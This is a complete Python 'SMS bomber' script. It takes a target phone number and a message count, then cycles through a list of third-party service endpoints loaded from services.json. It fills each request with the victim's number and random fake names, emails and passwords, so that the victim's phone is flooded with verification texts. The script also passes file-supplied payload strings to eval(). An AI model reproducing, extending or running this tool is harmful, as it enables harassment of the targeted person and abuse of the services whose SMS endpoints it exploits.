#!/usr/bin/env python3

import json
import argparse
import requests
from itertools import cycle
from randomData import *

class Service:

    def __init__(self, service):
        self.service = service

    def parse_data(self, target):
        if "data" in self.service:
            datatype = "data"
            payload = self.service["data"]
        elif "json" in self.service:
            datatype = "json"
            payload = self.service["json"]
        else:
            datatype = "url"
            payload = self.service["url"]

        for old, new in {
            "'" : '"',
            "%phone%" : target,
            "%name%" : randomName(),
            "%email%" : randomEmail(),
            "%password%" : randomPass()
        }.items():
            if old in payload:
                payload = payload.replace(old, new)

        return payload, datatype

parser = argparse.ArgumentParser(
    description="Simple sms bomber",
    epilog="Example: ./bomber.py -t 79877415069"
)
parser.add_argument("-t", "--target", default=False, help="target phone number for bombing")
parser.add_argument("-s", "--sms", default=False, type=int, help="sms count for bombing")
args = parser.parse_args()

target = args.target
sms = args.sms

if not target:
    target = input("enter phone num: ")
if not sms:
    sms = int(input("enter sms count: "))

if target[0] == '+':
    target = target[1::]
if target[0] == '8':
    target = '7' + target[1::]
if target[0] == '9':
    target = '7' + target

with open("services.json", "r") as file:
    services = json.load(file)["services"]

counter = 0
for i in cycle(range(len(services))):
    if counter >= sms:
        exit()
    service = Service(services[i])
    service.url = services[i]["url"]
    service.payload, service.datatype = service.parse_data(target)
    try:
        if service.datatype == "url":
            requests.post(service.payload)
        elif service.datatype == "data":
            requests.post(service.url, data=eval(service.payload))
        else:
            requests.post(service.url, json=eval(service.payload))
        print("ok")
        counter += 1
    except:
        print("fail", service.url)
